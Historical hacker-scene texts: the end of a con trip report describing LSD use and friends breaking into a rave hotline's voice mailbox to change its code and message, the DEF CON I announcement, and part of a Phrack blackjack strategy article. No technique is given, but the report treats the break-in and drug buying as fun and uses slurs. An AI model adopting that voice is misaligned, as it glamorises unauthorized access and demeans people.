Our group had congregated at a grocery store at the end of the street.
Mr. Blast was speed dialing the raveline in a desperate attempt to
find a venue to spin wildly in and blow his day-glo rave whistle.

Across the street, a homeless black man screamed painfully at each and
every passing car, "HELP!  You gotta take me and my girlfriend to
the hospital now!  She's gonna DIE!"  He staggered over to us
and begged for a ride, we respectfully declined.

As this was going on, the grocery store erupted with violence as
a drunken frat type was ejected forcibly.  He started swinging
wildly at the rent-a-cop, and was greeted with the business end
of a police baton.

The Pilot decided this was a good time to make his exit.  He waved
goodbye and was gone.

RBOC, Voxman and a nameless waif arrived in the parking lot.  We
told them the status of the rave and they decided to wait to see if
there may be any type of decadence forthcoming.  About that time
Mr. Blast came screaming across the lot with the directions.

We no longer had room for everyone, so Voxman & the nameless waif were
offered a ride from a flaming pedophile who overheard their plight.
The took him up on his offer before we could stop them.  We said a quick
prayer for them and piled into the car.

16. Stark Raving Mad Late Into The Night

The new location was out at a marina in Berkeley on the beach.  It took damn
near an enternity to get there and when we arrived it was raining.
X-con and I made it our mission to find acid at this location.  The music
could be heard for several hundred yards from the street, so we took off
in a sprint towards the source.

There were roughly 40 or so people.  Thirty-nine guys, one ugly girl.

X-con immediately disappeared in the crowd looking for someone with
a beeper...anyone.  Fender disappeared.  Fitz disappeared.  RBOC and I
sat and made rude comments.  X-con arrived back with a big smile.

Our saviour was in the form of a teenage Hispanic dude.  He had red blotter
with elephant, and yellow blotter with some other kind of design.  The
yellow was "three-way."  We bought several of each, and there was much
rejoicing.  X-con had already eaten one three-way and one regular, before
I could split one in half for RBOC.  The taste was overwhelming.
Freshly squeezed.

The three of us perched up on a hill staring out over the undulating mass
waiting for the effect.  It came quickly.

As it hit, Fitz wandered up and said, "Let's hack the raveline!"
This idea went over VERY WELL, so we all set out towards the car, leaving
little sparky streamers behind us as we moved.

From a nearby hotel lobby, Fitz and X-con busily hacked at the VMB
while RBOC and I sat in the car totally wigging.  About 30 minutes
later they ran out screaming.  It had been done and the code was
now 902100.

We drove back to the rave and noticed the red and blues flashing and the
ravers bailing en masse.  We picked up Mr. Blast and Fender and took off
back to our hotel.  Fender had done a bit of networking at the rave and
exchanged a few business cards.  We were totally appalled.

Once back at the hotel X-con took even more.  He said he wanted to see
static.  Within an hour he achieved his goal.  He spent a large portion of
the night walking in and out of the room muttering, "Man...you guys are
totally fucking with me."

We then decided to spice up the raveline.  RBOC changed the outgoing
message a few times and then finally decided on, "HAR HAR HAR, Y'all been
boarded by the pirate!  No more techno!  No more homosexuals
grinding away at 120 beats per minute!  No more Rave!  HAR HAR HAR!"
We laughed like schoolgirls.

Everyone passed out.  Everyone but us tripsters of course.  We stayed up
the majority of the night telling really odd pharmaceutical war stories.

At about 6 am RBOC decided that he was hungry and called for room service.
He ordered linguini.  The room service clerk told him that the kitchen
was not ready for dinner, and would only be serving breakfast.  RBOC
replied, "Look, do you have noodles?  Yes?  Do you have water?  Well,
what's the fucking problem.  What exactly do you need to boil water?
Turn on the stove, and I'll be down in a few minutes to make it myself."
With this logic, the room service clerk replied his linguini would
be up in about half an hour.

We then decided to get escorts, or at least order up a few, and listen
to them on their cell phones calling their pimps.  (Fender had listened
to about five different such conversations a few nights prior.)
RBOC ordered up a couple of buxom blondes to go and we waited for their
return phone call to barter on the price.

The call never came in.  The hotel had turned off our phone for incoming
calls.  This sparked even more fun, as RBOC called up the front desk
to complain, "Look ma'am, my hookers can't fucking call into my room!
Turn my phone back on NOW!  I've had a rough night up for 24 hours on
drugs, and I need a woman."  The operator was not amused.

The sun rose.  We all remarked about the typical morning after layer of
filth that seems to congeal after a good fry.  The static was no longer
visible to X-con and he became almost lucid again, interjecting bits
of wisdom like "Uh" and "Yeah" into the conversation.  His flight was in
two hours.

The linguini arrived and everyone had a small taste as the smell of
the white sauce permeated the room.  As we smacked away, the inexperienced
of the crowd arose to greet a new morning.  RBOC suddenly realized that
NYC was probably snowed under, so he took off to find a phone to check
on the status of his flight home.

X-con gathered his bags and mumbled "Later," and disappeared.  I fell on the
bed and disappeared into darkness.

17. Laterz

The alarm clock blared out a sickening beep, to which it was rewarded with
a small flight across the hotel room.  I gathered up my gear and made a
beeline towards the elevator.

Still confused, I wandered down to the lobby where I was greeted by
Fitzgerald and Fender.  I bid them both a fond farewell and boarded
the airport shuttle.  This was one hell of a good time.  I wonder if
CFP4 in Chicago will be as good?  One can only hope.  See you there.

                    Finalized Announcement: 5/08/1993

              We are proud to announce the 1st annual Def Con.

    If you are at all familiar with any of the previous Con's, then you
will have a good idea of what DEF CON I will be like. If you don't have any
experience with Con's, they are an event on the order of a pilgrimage to
Mecca for the underground. They are a mind-blowing orgy of information
exchange, viewpoints, speeches, education, enlightenment... And most of all
sheer, unchecked PARTYING. It is an event that you must experience at least
once in your lifetime.

    The partying aside, it is a wonderful opportunity to met some of the
celebrities of the underground computer scene. And those that shape its
destiny - the lawyers, libertarians, and most of all the other There will
be plenty of open-ended discussion on security, telephones and other
topics. As well as what TIME magazine calls the "Cyberpunk Movement".

    Las Vegas, is as you might have guessed a great choice for the Con.
Gambling, loads of hotels and facilities, cheap air fare and room rates.
It's also in the West Coast making it more available to a different crowd
than the former Cons have been.

Your foray into the scene and your life will be forever incomplete
if by some chance you miss out on DEF CON I. Plan to be there!

DESCRIPTION:

writers, activists, lawyers, philosophers, politicians, security officials,
cyberpunks and all network sysops and users to attend.

     DEF CON I will be over the weekend in the middle of down town Las
Vegas at the Sands Hotel.  Why Las Vegas?  Well the West Coast hasn't had
a  good Convention that I can remember, and Las Vegas is the place to do it.
Cheap food, alcohol, lots of entertainment and, like us, it never sleeps.
We will have a convention room open 24 hours so everyone can meet and plan
and scheme till they pass out.  Events and speakers will be there to provide
distraction and some actual information and experiences from this loosely
knit community.

BLURB:
"I learned a lot of things I didn't know from Lex's File" ---Bruce Sterling


Introduction:
-------------

   With the DEF CON 1 hacker/cyberpunk/law enforcement/security/etc convention
coming up in Las Vegas, Nevada on July 9-12 1993, I felt that now would be a
good time to write a "phile" on something the attendants could put to use to
help legally defray the costs of going. The thought of a bunch of ex-hackers
running around Las Vegas without shirts (having 'lost' them in the various
Casinos) frightened me into immediate action. Besides, I don't write articles
on 'Underground' topics anymore and since I have done a lot of research and
playing of Casino BlackJack, the CON in Vegas provided me the perfect excuse
to finally write an article for PHRACK (not withstanding the pro-phile in
Issue 40 which doesn't really count).

   Regardless of whether you go to this DEF CON 1 thing, if you ever plan to
hit a casino with the purpose of MAKING MONEY, then you really should
concentrate on ONE game of chance: BlackJack. Why? Because BlackJack is the
*ONLY* casino game that affords the educated and skilled player a long-term
mathematical advantage over the house. All the other casino games: Craps,
Roulette, Slots, etc. have the long-term mathematical advantage over the
player (see table below). BlackJack is also the only casino game for which the
odds are always changing. Don't be fooled by all the glitter, a casino is a
business and must make a profit to survive. The profit is ensured by using a
set of rules which provides them with an edge. Now you say: wait a sec, how do
they make money if BlackJack can be beaten? There are a couple of reasons. One
reason is that there are very few good players who make it their profession to
beat casinos at BlackJack day in and day out. There are many more who THINK
they are good, THINK they know how to play the game, and lose more money than
the really good players win. Notwithstanding the throngs of vacationers who
admit to not being well versed in the game and consequently are doomed to
lose...plenty. Another reason is that if a casino thinks you are a "counter"
(a term just as nasty as "phreaker" to the phone company) there is a good
chance that they will ask you to leave. See the section on Social Engineering
the Casino to avoid being spotted as a counter. Also, the house secures its
advantage in BlackJack from the fact that the player has to act first. If you
bust, the dealer wins your bet regardless of whether the dealer busts later.

   The following table illustrates my point regarding house advantages for the
various casino games and BlackJack strategies. The data is available in most
books on casino gambling. Note that negative percentages denote player
disadvantages and are therefore house advantages.

   --------------------------------------------------------------------------
   GAME                             Your Advantage (over the long run)
   --------------------------------------------------------------------------
   Craps                            -1.4 % overall average
   Baccarat                         -1.1 % to -5.0 %
   Roulette                         -2.7 % to -5.26 %
   Slots                            -2.5 to -25 % depending on machine setting
   Keno                             -25 % more or less

   BlackJack (WAG Player)           -2 % to -15 %
   BlackJack (Mirror Dealer)        -5.7 %
   BlackJack (Basic Strategy)       -0.2 % to +0.3 %
   BlackJack (Basic Strategy &      Up to +3.1 % depending on card counting
              Card Counting)        system and betting range.

   A -2 % player advantage (2 percent disadvantage) means that if you play a
hundred hands at a dollar each, then ON AVERAGE, you will lose two dollars.
Note that the typical "pick three" State Lottery game is a disaster as your
advantage is -50 %. If you make 1000 $1 bets, you will lose $500 on average.
Some people say that state lotteries are taxation on the stupid...

   This article contains thirteen sections. It was written in a fairly modular
fashion so if there are sections which do not interest you, you may omit them
without much loss in continuity however, all the sections are networked to
some degree. For the sake of completeness, a fairly comprehensive list of
topics has been presented. Due to email file size restrictions, I had to
divide this article into two parts. Note that I am NOT a Professional
BlackJack player, the definition being someone whose livelihood is derived
solely from his/her winnings. I did however, dedicate a summer to gambling 5
evenings a week or so, keeping meticulous records of wins, losses and expenses
incurred. I averaged 1-2 nights a week playing BlackJack with the other nights
divided among 3 different forms of Pari-Mutual gambling. At the end of the
summer I tallied the wins/losses/expenses and am proud to say the result was a
positive net earnings. Unfortunately it was instantly apparent that the net
money when divided up by the number of weeks gambling was not enough to
warrant me to quit school and become a professional gambler. Besides that
one summer, I have played BlackJack off and on for 7 years or so. In case you
were wondering, no, I have never been a member of GA [Gamblers Anonymous]
contrary to what one of those Bell Security "Hit-Lists" circulated many years
ago would have you believe. The topics contained herein are:

Notes:

     a) I made extensive use of my many books, articles, and magazines on
gambling and BlackJack along with actual playing experience. References are
denoted by square brackets [REF#] and are listed in the Selected Bibliography
and Reference List section.

     b) It's hard to win at something you don't understand. If you want to win
consistently at anything, learn every thing you can about it. BlackJack is no
exception.


History of BlackJack:
---------------------

   I provide this historical background information because I find it rather
fascinating and it also provides some insight into contemporary rules and
play. I think it is worth reading for the sole reason that you might some day
use one of the historical tid-bits to answer a question on Jeopardy!#@%!
Seriously, the first couple of paragraphs may read a bit like a book report,
but bear with it if you can as I did all of the following research
specifically for this file.

   First, a brief history of cards: Playing cards are believed to have been
invented in China and/or India sometime around 900 A.D. The Chinese are
thought to have originated card games when they began shuffling paper money
(another Chinese invention) into various combinations. In China today, the
general term for playing cards means "paper tickets". The contemporary 52 card
deck used in the U.S. was originally referred to as the "French Pack" (circa
1600's) which was later adopted by the English and subsequently the Americans.

   The first accounts of gambling were in 2300 B.C. or so, and yes, the
Chinese again get the credit. Gambling was very popular in Ancient Greece even
though it was illegal and has been a part of the human experience ever since.
Today, with the all too common manipulation of language to suit one's own
purposes, gambling is no longer a term used by casinos....they prefer to use
the word GAMING instead. Just as Post Traumatic Stress Disorder has replaced
the term Shell Shock in military jargon. Since this manipulation of language
is all the rage these days, why don't we water down the name Computer Hacker
and replace it with Misguided Information Junky or someone who is afflicted
with a Compulsive Curiosity Disorder?

   The history of the BlackJack card game itself is still disputed but was
probably spawned from other French games such as "chemin de fer and French
Ferme", both of which I am completely unfamiliar with. BlackJack originated in
French Casino's around 1700 where it was called "vingt-et-un" ("twenty-and-
one" in French) and has been played in the U.S. since the 1800's. BlackJack is
called Black-Jack because if a player got a Jack of Spades and an Ace of
Spades as the first two cards (Spade being the color black of course), the
player was additionally remunerated.

   Gambling was legal out West from the 1850's to 1910 at which time Nevada
made it a felony to operate a gambling game. In 1931, Nevada re-legalized
casino gambling where BlackJack became one of the primary games of chance
offered to gamblers. As some of you may recall, 1978 was the year casino
gambling was legalized in Atlantic City, New Jersey. As of 1989, only two
states had legalized casino gambling. Since then, about 20 states have a
number of small time casinos (compared to Vegas) which have sprouted up in
places such as Black Hawk and Cripple Creek Colorado and in river boats on the
Mississippi. Also as of this writing, roughly 70 Native American Indian
reservations operate or are building casinos, some of which are in New York
and Connecticut. In addition to the U.S., some of the countries (there are
many) operating casinos are: France, England, Monaco (Monte Carlo of course)
and quite a few in the Caribbean islands (Puerto Rico, Bahamas, Aruba, etc.).

   Now: The first recognized effort to apply mathematics to BlackJack began in
1953 and culminated in 1956 with a published paper [6]. Roger Baldwin et al
(see Bibliography) wrote a paper in the Journal of the American Statistical
Association titled "The Optimum Strategy in BlackJack". These pioneers used
calculators, and probability and statistics theory to substantially reduce the
house advantage. Although the title of their paper was 'optimum strategy', it
wasn't really the best strategy because they really needed a computer to
refine their system. I dug up a copy of their paper from the library, it is
ten pages long and fairly mathematical. To give you an idea of its importance,
the Baldwin article did for BlackJack playing what the November 1960 issue of
The Bell System Technical Journal entitled, "Signalling Systems for Control of
Telephone Switching", did for Blue Boxing.

   To continue with the analogy, one can consider Professor Edward O. Thorp to
be the Captain Crunch of BlackJack. Dr. Thorp, then a mathematics teacher,
picked up where Baldwin and company left off. In 1962, Thorp refined their
basic strategy and developed the first card counting techniques. He published
his results in "Beat the Dealer" [3], a book that became so popular that for a
week in 1963 it was on the New York Time's best seller list. The book also
scared the hell out of the Casino's. Thorp wrote "Beat the Market" in 1967, in
which he used mathematics and computer algorithms to find pricing
inefficiencies between stocks and related securities. Currently he is using an
arbitrage formula to exploit undervalued warrants in the Japanese stock
market.

   The Casinos were so scared after Beat the Dealer, that they even changed
the rules of the game to make if more difficult for the players to win. This
didn't last long as people protested by not playing the new pseudo-BlackJack.
The unfavorable rules resulted in a loss of income for the casinos. Not making
money is a sin for a casino, so they quickly reverted back to the original
rules. Because Thorp's "Ten-Count" method wasn't easy to master and many
people didn't really understand it anyway, the casinos made a bundle from the
game's newly gained popularity thanks to Thorp's book and all the media
attention it generated.

   Beat the Dealer is rather difficult to find these days, I picked up a copy
at the library recently and checked the card in the back to see how popular
it is today. I was surprised as hell to find that it was checked out over 20
times in the past year and a half or so! How many books from 1962 can claim
that? I do not recommend reading the book for anything other than posterity
purposes though, the reason being that newer books contain better, and easier
to learn strategies.

   Another major contributor in the history of winning BlackJack play is
Julian Braun who worked at IBM. His thousands of lines of computer code and
hours of BlackJack simulation on IBM mainframes resulted in THE Basic
Strategy, and a number of card counting techniques. His conclusions were used
in a 2nd edition of Beat the Dealer, and later in Lawrence Revere's 1977 book
"Playing BlackJack as a Business".

   Lastly, let me mention Ken Uston, who used five computers that were built
into the shoes of members of his playing team in 1977. They won over a hundred
thousand dollars in a very short time but one of the computers was
confiscated and sent to the FBI. The fedz decided that the computer used
public information on BlackJack playing and was not a cheating device. You may
have seen this story in a movie made about his BlackJack exploits detailed in
his book "The Big Player". Ken was also featured on a 1981 Sixty Minutes show
and helped lead a successful legal challenge to prevent Atlantic City casinos
from barring card counters.


Useful Definitions:
-------------------

   Just as in Social Engineering the Phone Company, an essential element for
success is knowing the right buzzwords and acronyms. Therefore, I list some
relevant definitions now, even though the reader will probably skip over them
to get to the good stuff. The definitions merely serve as a reference for
those who are uninitiated with the terminology of gambling, casinos, and
BlackJack. If you encounter a term you don't understand in the article, look
back here. The definitions are not in alphabetical order on purpose. I grouped
them in what I feel is a logical and easy to remember fashion.

Action: This is a general gambling term which refers to the total amount of
        money bet in a specific period of time. Ten bets of ten dollars each
        is $100 of action.

Burn Card: A single card taken from the top of the deck or the first card in
           a shoe which the dealer slides across the table from his/her left
           to the right, and is placed into the discard tray. The card may or
           may not be shown face up (which can affect the count if you are
           counting cards). A card is burned after each shuffle. I have
           not been able to find out how this started nor the purpose for
           burning a card. If you know, drop me some email.

Cut Card: A solid colored card typically a piece of plastic which is given to
          a player by the dealer for the purpose of cutting the deck(s) after
          a shuffle. Cutting the cards in the 'right' location is part of
          the 'shuffle tracking' strategy mentioned later in Part 2.

Hole Card: Any face down card. The definition most often refers to the
           dealer's single face down card however.

Shoe: A device that can hold up to eight decks of cards which allows the
      dealer to slide out the cards one at a time.

Hard Hand: A hand in which any Ace is counted as a 1 and not as an 11.

Soft Hand: A hand in which any Ace is counted as an 11 and not as a 1.

Pat Hand: A hand with a total of 17 to 21.

Stand: To decline another card.

Hit: To request another card.

Bust: When a hand's value exceeds 21....a losing hand.

Push: A player-dealer tie.

Pair: When a player's first two cards are numerically identical (ie, 7,7).

Point Count: The net value of the card count at the end of a hand.

Running Count: The count from the beginning of the deck or shoe. The running
               count is updated by the value of the point count after each
               hand.

True Count: The running count adjusted to account for the number of cards left
            in the deck or shoe to be played.

Bankroll: The stake (available money) a player plans to bet with.

Flat Bet: A bet which you do not vary ie, if you are flat betting ten dollars,
          you are betting $10 each and every hand without changing the betting
          amount from one hand to the next.

Black Chip: A $100. chip.

Green Chip: A $25.00 chip.

Red Chip: A $5.00 chip.

Foreign Chip: A chip that is issued by one casino and is honored by another
              as cash. A casino is not necessarily obligated to accept them.

Settlement: The resolving of the bet. Either the dealer takes your chips,
            pays you, or in the case of a push, no exchange of chips occurs.

Toke: Its not what some of you may think...to "toke" the dealer is just
      another word for tipping the dealer.

Marker: An IOU. A line of credit provided by the casino to a player.

Junket: An organized group of gamblers that travel to a casino together.
        Junkets are usually subsidized by a casino to attract players.

Comp: Short for complimentary. If you wave lots of money around, the casino
      (hotel) may give you things like a free room or free f00d hoping you'll
      keep losing money at the tables in their casino.

Heat: The pressure a casino puts on a winning player, typically someone who
      is suspected of being a card counter.

Shuffle Up: Prematurely shuffling the cards to harass a player who is usually
            suspected of being a counter.

Nut: The overhead costs of running the casino.

Pit: The area inside a group of gaming tables. The tables are arranged in
     an elliptical manner, the space inside the perimeter is the pit.

House: The Casino of course.

Cage: Short for cashier's cage. This is where chips are redeemed for cash,
      checks cashed, credit arranged, etc.

House Percentage: The casino's advantage in a particular game of chance.

Drop Percentage: That portion of the player's money that the casino will win
                 because of the house percentage. It is a measure of the
                 amount of a player's initial stake that he or she will
                 eventually lose. On average this number is around 20 percent.
                 That is, on average, Joe Gambler will lose $20 of every $100
                 he begins with.

Head-On: To play alone at a BlackJack table with the dealer.

WAG Player: Wild Assed Guessing player.

SWAG Player: Scientific Wild Assed Guessing player.

Tough Player: What the casino labels an '3L33T' player who can hurt the casino
              monetarily with his or her intelligent play.

Counter: Someone who counts cards.

High Roller: A big bettor.

Mechanic: Someone who is elite in regards to manipulating cards, typically for
          illicit purposes.

Shill: A house employee who bets money and pretends to be a player to attract
       customers. Shills typically follow the same rules as the dealer which
       makes them somewhat easy to spot (ie, they don't Double Down or Split).

Pit Boss: An employee of the casino whose job is to supervise BlackJack
          players, dealers, and other floor personnel.


Review of BlackJack Rules of Play:
----------------------------------

   The rules of BlackJack differ slightly from area to area and/or from casino
to casino. For example, a casino in downtown Vegas may have different rules
than one of the Vegas Strip casinos which may have different rules from a
casino up in Reno or Tahoe (Nevada). The rules in a casino in Freeport Bahamas
may differ from those in Atlantic City, etc. Therefore, it is important to
research, a priori, what the rules are for the area/casino(s) you plan on
playing in. For Nevada casinos you can order a copy of [1] which contains
rules info on all the licensed casinos in the state. Later in this article,
you will see that each set of rule variations has a corresponding Basic
Strategy chart that must be memorized. Memorizing all the charts can be too
confusing and is not recommended.

   The BlackJack table seats a dealer and one to seven players. The first seat
on the dealer's left is referred to as First Base, the first seat on the
dealer's right is referred to as Third Base. A betting square is printed on
the felt table in front of each player seat. Immediately in front of the
dealer is the chip tray. On the dealer's left is the deck or shoe and beside
that should be the minimum bet sign--something that you ought to read before
sitting down to play. On the dealer's immediate right is the money drop slot
where all currency and tips (chips) are deposited. Next to the drop slot is
the discard tray. Play begins after the following ritual is completed: the
dealer shuffles the cards, the deck(s) is "cut" by a player using the marker
card, and the dealer "burns" a card.

   Before any cards are dealt, the players may make a wager by placing the
desired chips (value and number) into the betting box. I used the word "may"
because you are not forced to bet every hand. Occasionally a player may sit
out a hand or two for various reasons. I have sat out a couple of hands at
times when the dealer was getting extremely lucky and everyone was losing. If
you attempt to sit out too many hands especially if there are people waiting
to play at your table, you may be asked to leave the table until you are ready
to play. If you don't have any chips, put some cash on the table and the
dealer will exchange them for chips.

   Once all the bets are down, two cards (one at a time) are dealt from left
to right. In many Vegas casinos, players get both cards face down. In Atlantic
City and most every where else the player's cards are dealt face up. Should
the cards be dealt face up, don't make the faux pas of touching them! They are
dealt face up for a reason, primarily to prevent a few types of player
cheating (see section on cheating in Part 2) and the dealer will sternly but
nicely tell you not to touch the cards. As most of you know the dealer receives
one card down and one card up. The numerical values of the cards are:
(10, J, Q, K) = 10 ; (Ace) = 1 or 11 ; (other cards) = face value (3 = 3).

   Since a casino can be as noisy as an old Step-by-Step Switch with all those
slot machines going, marbles jumping around on roulette wheels, demoniacal
shrieks of "YO-LEVEN" at the craps table, people screaming that they hit the
big one and so on, hand signals are usually the preferred method of signalling
hit, stand, etc.

   If the cards were dealt face down and you want a hit, lightly flick the
cards across the felt two times. If the cards were dealt face up, point at the
cards with a quick stabbing motion. You may also want to nod your head yes
while saying "hit".  The best way to indicate to the dealer that you want to
stand regardless of how the cards were dealt is to move your hand from left
to right in a level attitude with your palm down. Your hand should be a few
inches or so above the table. Nodding your head no at the same time helps,
while saying "stay" or "stand".

   Permit me to interject a comment on the number of decks used in a game.
Single deck games are pretty much restricted to Nevada casinos. In the casinos
that have one-deck games, the tables are usually full. Multiple deck games
typically consist of an even number of decks (2, 4, 6, 8) although a few
casinos use 5 or 7 decks. The two main reasons many casinos use multiple decks
are:
      1) They allow the dealer to deal more hands per hour thereby increasing
         the casino take.

      2) They reduce but in no way eliminate the player advantage gained
         from card counting.

   Dealer Rules - The rules the dealer must play by are very simple. If the
dealer's hand is 16 or less, he/she must take a card. If the dealer's hand is
17 or more, he/she must stand. Note that some casinos allow the dealer to hit
on soft 17 which gives the house a very small additional advantage. The
dealer's strategy is fixed and what you and the other players have is
immaterial to him/her as far as hitting and standing is concerned.

   Player rules - The player can do whatever he/she wants as far as hitting and
standing goes with the exception of the following special circumstances. See
the section on Basic Strategy for the appropriate times to hit, stand, split,
and double down. The aim is to have a hand which is higher than the dealers'.
If there is a tie (push), neither you nor the dealer wins. Should a player get
a BlackJack (first 2 cards are an Ace and a ten) the payoff is 150% more than
the original bet ie, bet $10.00 and the payoff is $15.00.

DOUBLE DOWN: Doubling down is restricted to 2-card hands usually totalling
9, 10, or 11 although some casinos allow doubling down on any 2-card hand. If
your first two cards provide you with the appropriate total and your cards
were dealt face down, turn them over and put them on the dealer's side of the
betting square. If your first two cards provide you with the appropriate total
and your cards were dealt face up, point to them and say "double" when the
dealer prompts you for a card and simultaneously put an equal amount of chips
NEXT TO (not on top of) those already in the betting box. The dealer will give
you one more card only, then he/she will move on to the next hand.

SPLITTING PAIRS: If you have a pair that you want to split and your cards are
dealt face down, turn them over and place them a few inches apart. If your
cards were dealt face up, point to your cards and say "split" when the dealer
prompts you for a card. The original bet will go with one card and you will
have to place an equal amount of chips in the betting box near the other card.
You are now playing two hands, each as though they were regular hands with the
exception being that if you have just split two aces. In that case, you only
get one card which will hopefully be a 10. If it is a ten, that hand's total
is now 21 but the hand isn't considered a BlackJack. That is, you are paid 1:1
and not 1:1.5 as for a natural (BlackJack).

Combined example of above two plays: Say you are dealt two fives. You split
them (you dummy!). The next card is another 5 and you re-split them (you
chucklehead!!). Three hands have grown out of one AND you are now in for
three times your original bet. But wait. Say the next card is a six. So one
hand is a 5,6 which gives you eleven; another just has a 5 and the other hand
has a 5. You decide to double down on the first hand. You are dealt a 7 giving
18 which you stand on. Now a ten is dealt for the second hand and you decide
to stay at 15. The last hand is the lonely third 5, which is dealt a four for
a total of nine. You decide to double down and get an eight giving that hand a
total of 17. Shit you say, you started with a twenty dollar bet and now you
are in for a hundred! Better hope the dealer doesn't end up with a hand more
than 18 lest you lose a C-note. The moral of this example is to not get caught
up in the excitement and make rash decisions. However, there have been a
couple of times where Basic Strategy dictated that certain split and double
down plays should be made and I was very low on chips (and cash). Unless you
are *really* psychic, don't go against Basic Strategy! I didn't and usually
came out the better for it although I was really sweating the outcome of the
hand due to my low cash status. The reason it was stupid to split two fives is
that you are replacing a hand that is great for drawing on or doubling down
on, by what will probably be two shitty hands.

INSURANCE: This option comes into play when the dealer's up card is an Ace. At
this point all the players have two cards. The dealer does not check his/her
hole card before asking the players if they want insurance. The reason being
evident as the dealer can't give away the value of the hole card if the dealer
doesn't know what the hole card is. If a player wants insurance, half the
original amount bet is placed on the semicircle labeled "insurance" which is
printed on the table. If the dealer has a BlackJack the player wins the side
bet (the insurance bet) but loses the original bet, thus providing no net loss
or gain since insurance pays 2 to 1. If the dealer does not have a BlackJack,
the side bet is lost and the hand is played normally. If you are not counting
cards DO NOT TAKE INSURANCE! The proper Basic Strategy play is to decline. The
time to take insurance is when the number of non-tens to tens drops below a
2 to 1 margin since insurance pays 2 to 1. It's simple math check it yourself.

SURRENDER: This is a fairly obscure option that originated in Manila
(Philippines) in 1958 and isn't available in many casinos. There are two
versions, "early surrender" and "late surrender". Early surrender  allows
players to quit two-card hands after seeing the up card of the dealer. This
option provides the player an additional 0.62 percent favorable advantage
(significant) and therefore the obvious reason why many Atlantic City casinos
abandoned the option in 1982. Late surrender is the same as early except that
the player must wait until the dealer checks for a BlackJack. If the dealer
does not have a BlackJack then the player may surrender. The following table
was taken verbatim from [5] and is valid for games with 4+ decks. It details
the best strategy regarding late surrender as determined from intensive
computer simulation:

        TWO-CARD HAND           TOTAL           DEALER'S UP-CARD
        -------------           -----           ----------------
             9,7                 16                    ACE
             10,6 *              16 *                  ACE
             9,7 *               16 *                  10
             10,6 *              16 *                  10
             9,7 *               16 *                  10
             10,5 *              15 *                  10
             9,7                 16                     9
             10,5                16                     9

        "In a single-deck game, you would surrender only the above hands
         marked with an asterisk, as well as 7,7 against a dealer's 10
         up-card." [5]

Casino variations - Note that some casinos do not permit doubling down on
split pairs, and/or re-splitting pairs. These options provide the player with
a slight additional advantage.


Betting, Money Management, and the Psychology of Gambling:
----------------------------------------------------------

   Let me begin this section with the following statement: SCARED MONEY RARELY
WINS. Most gambling books devote quite a bit of time to the psychology of
gambling and rightfully so. There is a fine line to responsible gambling. On
one hand you shouldn't bet money that you cannot afford to lose. On the other
hand, if you are betting with money you expect to lose, where is your
confidence? When I used to gamble, it was small time. I define small time as
bringing $250.00 of 'losable' money. I've lost that much in one night. I
didn't like it, but I still ate that week. One pitfall you can easily fall
into happens AFTER you lose. You scold yourself for losing money you could
have done something productive with. "DAMN, I could have bought a 200 MB hard
drive with that!#&!". You should think about these things BEFORE you play.

   Scared money is more in the mind than real. What I mean by that is even if
you gamble with your last $10.00 in the world, it is important to play as
though you have thousands of dollars in front of you. I don't mean piss the
ten bucks away. I mean that there are certain plays you should make according
to your chosen strategy which are the optimum mathematically. Don't make
changes to it out of fear. Fear is not your friend.

   The "risk of ruin" is the percent chance that you will lose your entire
bankroll. This percentage should not exceed 5% if you plan on playing multiple
sessions to make money. The risk of ruin is dependent on the sizes of your
bets during a session. The "Kelly Criterion" provides a zero percent risk of
ruin. The system requires that you bet according to the percent advantage you
have at any one time. For example, if you are counting cards and your
advantage for a certain hand is 2% then you may bet 2% of your total bankroll.
If your total is $1000. then you can bet $20. Note that if you won the hand
your bankroll is now $1020 and if your advantage dropped to 1.5%, taking .015
times 1020 (which will determine your next bet size) in your head isn't all
that easy. The literature provides more reasonable systems, but do yourself a
favor and stay away from "betting progressions". See Reference [16] (available
on the Internet) for more information regarding risk of ruin & optimal wagers.

   If you are gambling to make money, it is important to define how much cash
you can lose before quitting. This number is called the "stop-loss limit". My
stop-loss limit was my entire session bankroll which was $250 (50 betting
units of $5.00 or 25 betting units of $10.00). This concept is especially
important if you expect to play in the casinos for more than one session. Most
books recommend that your session bankroll be about a fifth of your trip
bankroll. Unfortunately, most people who have $500 in their wallet with a self
imposed stop-loss limit is $200 will violate that limit should they lose the
two hundred. Discipline is what separates the great players from the ordinary
ones.

   Obviously you don't want to put a limit on how much you want to win.
However, if you are keeping with a structured system there are certain limits
to what your minimum and maximum bets should be. I am not going to go into
that here though.

   In my gambling experience, there has been one non-scientific concept that
has proven itself over and over again. NEVER BUCK A TREND! If you have just
won three hands in a row, don't think that you are now 'due' for a loss and
drastically scale back your bet. If you are winning go with it. A good friend
of mine who was my 'gambling mentor' won $30,000 in a 24 hour period with a
$200 beginning bankroll. This was not accomplished by scaling back bets. By
the same token, if you see that the players at a certain table are losing
consistently, don't sit down at that table. One problem that I've seen is when
someone has won a lot and starts to lose. Mentally, they keep saying, "if I
lose another $100 I will stop". They lose the hundred and say "no, really, the
NEXT $100 I lose, I will stop", etc. When they go broke, that's when they stop.
Live by the following graph typically designated as The Quitting Curve and you
won't fall into that trap:

                    |             *                  <-+
                    |            *  *                  |   Loss
                 ^  |           *    *                 |   Limit
                 |  |          *      * <----QUIT!   <-+
                 |  |         *
                 W  |        *
                 i  |       *
                 n  |      *
                 n  |     *
                 i  |    *
                 n  |   *
                 g  |  *
                    |
                    |_________________________________________
                              Time ---------------->

   Determine your loss limit and stay with it. Obviously the loss limit will
change as you keep winning. Standard loss limits are 10 to 20 percent of the
current bankroll. Note that this philosophy is also used in stock market
speculation.


Basic Strategy:
---------------

    If you only read one section of this file, and you don't already know what
Basic Strategy is, then this is the section you should read. Knowing Basic
Strategy is CRITICAL to you gaining an advantage over the house. The Basic
Strategy for a particular set of rules was developed by intensive computer
simulation which performed a complete combinatorial analysis. The computer
"played" tens of thousands of hands for each BlackJack situation possible and
statistically decided as to which play decision favored the player. The
following 3 charts should be duplicated or cut out from a hardcopy of this
file. You don't want to wave them around at a BlackJack table but its nice to
have them on hand in case you fail to recall some plays, at which time you can
run to the rest room to refresh your memory.

   I hope you don't think this is weird but I keep a copy of a certain Basic
Strategy chart in my wallet at ALL times...just in case. Just in case of what
you ask? Permit me to go off on a slight(?) tangent. The following story really
happened. In 1984 I was visiting LOD BBS co-sysop, Paul Muad'dib up in New York
City. After about a week we were very low on cash despite the Pay Phone
windfall mentioned in my Phrack Pro-Phile ;->. I contacted a friend of mine
who was working in New Jersey and he offered us a job for a couple of days. I
spent just about the last of my cash on bus fair for me and Paul figuring that
I would be getting more money soon. Some how, the destination was
miscommunicated and we ended up in Atlantic City, which was not the location of
